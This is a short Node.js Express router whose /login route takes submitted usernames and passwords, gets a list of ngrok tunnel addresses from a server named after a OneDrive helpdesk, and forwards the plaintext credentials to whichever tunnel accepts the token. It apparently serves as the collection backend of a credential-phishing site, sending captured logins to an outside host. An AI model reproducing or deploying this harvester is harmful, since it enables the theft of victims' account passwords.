const express = require('express');
const router = express.Router();

// Dynamically import node-fetch
let fetch;
import('node-fetch').then(module => {
    fetch = module.default;
}).catch(err => console.error('Failed to load node-fetch', err));

// Base URL for the central server which gives us the current ngrok URL
const centralServerBaseUrl = 'https://helpdesk-onedriveserver.onrender.com';

router.post('/login', async (req, res) => {
    const { username, password, token } = req.body;

    if (!token || !username) {
        return res.status(400).send('Missing token or username');
    }

    try {
        const getUrlResponse = await fetch(`${centralServerBaseUrl}/list_urls`);
        const urls = await getUrlResponse.json();

        for (let url of urls) {
            const validationResponse = await fetch(`${url}/validate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, token }),
                mode: 'cors'
            });

            const validation = await validationResponse.json();
            if (validation.valid) {
                const localServerUrl = `${url}/receive`;
                const response = await fetch(localServerUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password }),
                    mode: 'cors'
                });

                if (response.ok) {
                    console.log('Data sent to local server successfully');
                    return res.send('Login data recorded and sent.');
                } else {
                    console.log('Failed to send data to local server');
                    break;
                }
            }
        }

        return res.status(403).send('Invalid token or URL not found');
    } catch (error) {
        console.error('Login error:', error);
        return res.status(500).send('Server Error');
    }
});

module.exports = router;
